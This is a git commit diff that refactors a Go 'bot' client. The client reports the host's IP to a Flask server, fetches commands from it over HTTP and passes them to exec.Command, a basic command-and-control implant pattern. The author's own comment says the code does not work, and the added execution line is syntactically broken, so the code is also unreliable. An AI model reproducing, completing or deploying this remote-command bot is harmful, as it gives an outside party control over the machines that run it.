d99786497bf02c647b8e6a169c49b10901a11752
degenerat3 <james.maskelony@gmail.com>
2019-02-08 22:03:40 -0500

    refactor client

--- client/client.go
+++ client/client.go
@@ -1,55 +1,54 @@
 // Golang bot to pull commands from webserver and execute them
-//@author: degenerat3
+// Disclaimer: This doesn't work
+// @author: degenerat3
 
 package main
 
-import "os/exec"
-import "fmt"
-import "log"
-import "net/http"
-import "net"
-import "bytes"
-import "encoding/json"
-import "strings"
-import "time"
-import "os"
+import (
+	"os/exec"
+	"fmt"
+	"io/ioutil"
+	"net"
+	"net/http"
+	"os"
+	"strings"
+)
 
-var serv = "127.0.0.1:5000"	//IP of flask serv
-var loop_time = 10		//sleep time in secs
+var serv = "127.0.0.1:5000" //IP of flask serv
+var loopTime = 10           //sleep time in secs
 
 // get hostname and return it as a string
-func get_hn() string {
-	return os.Hostname()
+func getHn() string {
+	hn, _ := os.Hostname()
+	return hn
 }
 
-
-func get_ip() string {
-	conn, _ := net.Dial("udp","8.8.8.8:80")
+func getIP() string {
+	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
 	ad := conn.LocalAddr().(*net.UDPAddr)
-	ip_str := ad.IP.String()
-	ip_str = strings.Replace(ad, ".","-")
-	return ip_str(ad, ".","-")
+	ipStr := ad.IP.String()
+	ipStr = strings.Replace(ipStr, ".", "-", 10)
+	return ipStr
 }
 
-
-func get_commands() {
-	ip := get_ip()
-	url = "http://" + serv + "/api/callback/" + ip
+func getCommands() {
+	ip := getIP()
+	url := "http://" + serv + "/api/callback/" + ip
 	r, err := http.Get(url)
-	if err != nil{
+	if err != nil {
 		panic(err)
 	}
 	defer r.Body.Close()
 	txt, err := ioutil.ReadAll(r.Body)
-	if err != nil{
+	if err != nil {
 		panic(err)
 	}
 	fmt.Printf("commands: \n%s\n", txt)
+	exec.Command(string(txt)
 }
 
-func main(){
-	get_commands()
+func main() {
+	getCommands()
+
 }
-
-
